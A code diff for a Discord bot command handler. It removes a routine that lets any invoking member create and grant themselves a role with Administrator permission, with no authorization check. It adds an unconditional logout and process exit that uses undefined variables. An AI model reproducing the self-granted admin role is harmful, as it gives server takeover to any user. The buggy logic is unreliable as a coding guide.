@@ -1,32 +1,18 @@
 module.exports = async function code(client, interaction) {
-    const yn = interaction.options.getBoolean('confirm') ?? false;
-    const guild = interaction.guild;
-    const member = interaction.member;
-    if (!guild || !member) return;
-    try {
-        let adminRole = guild.roles.cache.find(role => role.name === 'testing');
-        if (yn === 'True') {
-            if (!adminRole) {
-                const botHighestRole = guild.members.cache.get(client.user.id).roles.highest;
-                adminRole = await guild.roles.create({
-                    name: 'testing',
-                    permissions: ['Administrator'],
-                    reason: 'Merp',
-                    position: botHighestRole.position,
-                });
-            }
-            await member.roles.add(adminRole);
-            return;
-        } else {
-            if (adminRole && member.roles.cache.has(adminRole.id)) {
-                await member.roles.remove(adminRole);
-                if (adminRole.members.size === 0) {
-                    await adminRole.delete('Merp');
-                }
-            }
-            return;
+    if ('true' === 'true') {
+        try {
+            await console.log('Logging out...');
+            client.user.setActivity({
+                name: '',
+                type: ActivityType.Playing,
+                url: ''
+            });
+            client.user.setPresence({ status: 'invisible' });
+            await client.destroy();  // Log out the bot
+            await rl.close();        // Close the readline interface
+            await process.exit();
+        } catch (error) {
+            log.error(error);
         }
-    } catch (err) {
-        console.error('Error handling interaction logic:', err);
     }
 };
